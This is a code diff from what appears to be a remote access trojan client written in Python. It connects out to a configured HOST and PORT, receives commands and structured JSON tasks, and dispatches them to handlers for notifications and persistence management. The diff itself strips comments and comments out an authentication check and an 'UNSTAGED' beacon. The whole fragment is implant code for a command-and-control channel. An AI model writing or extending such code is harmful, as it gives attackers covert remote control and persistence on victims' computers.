@@ -338,7 +338,6 @@ def _write_index(index_dict):
         path = _index_path()
         with open(path, "wb") as fh:
             fh.write(enc)
-        # attempt to tighten permissions on POSIX
         if os.name != "nt":
             try:
                 os.chmod(path, 0o600)
@@ -463,19 +462,17 @@ def main():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((HOST, PORT))
-            # if recv_command(s) != auth_code: break
-            send_data(s, b'UNSTAGED')
+            # if recv_command(s) != auth_code: break TODO
+            # send_data(s, b'UNSTAGED') TODO
             while True:
                 try:
                     cmd = recv_command(s)
-                    # Support structured JSON tasks defined by api.connection_protocol.create_task
                     try:
                         task_obj = json.loads(cmd)
                         if isinstance(task_obj, dict) and 'module' in task_obj:
                             module = task_obj.get('module')
                             action = task_obj.get('action')
                             args = task_obj.get('args', {}) or {}
-                            # Map protocol tasks to existing handlers
                             if module == 'notification' and action == 'send':
                                 send_notification(s, args.get('title'), args.get('message'), args.get('app'))
                                 continue
@@ -499,7 +496,6 @@ def main():
                                     del_persistence(s)
                                 json_send(s, {'result': 'completed'})
                                 continue
-                            # Unknown structured task -> fall back to old handling
                     except Exception:
                         pass
                     print("CMD: " + cmd)
